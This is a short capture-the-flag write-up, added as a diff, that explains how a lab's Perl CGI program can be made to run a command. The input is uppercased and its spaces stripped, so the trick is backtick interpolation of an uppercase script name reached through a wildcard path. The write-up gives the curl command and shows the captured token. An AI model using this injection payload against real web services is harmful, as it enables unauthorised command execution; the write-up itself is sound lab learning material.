@@ -1,0 +1,16 @@
+The Perl program retrieves x, y parameters from CGI requests, and we can make the program evaluate the values of the parameter.
+
+The program modifies the value of x changing all the small letters into capital letters and then deleting all the spaces.
+
+So we understand that we cannot send directly 'x="`getflag > /tmp/flag`"' because the command will be modified.
+
+Instead, we can write a script and sends the path to this script as the value of x, wrapping with backticks, which are used to perform command interpolations.
+echo "getflag > /tmp/flag" > /tmp/EXPLOIT
+chmod +x /tmp/EXPLOIT
+
+By the way we would need the name of the script to be in capitals and also when sending params, the path to the script with wildcards instead of absolute path because it will be modified.
+
+curl 127.0.0.1:4646 -d 'x="`/*/EXPLOIT`"'
+
+cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
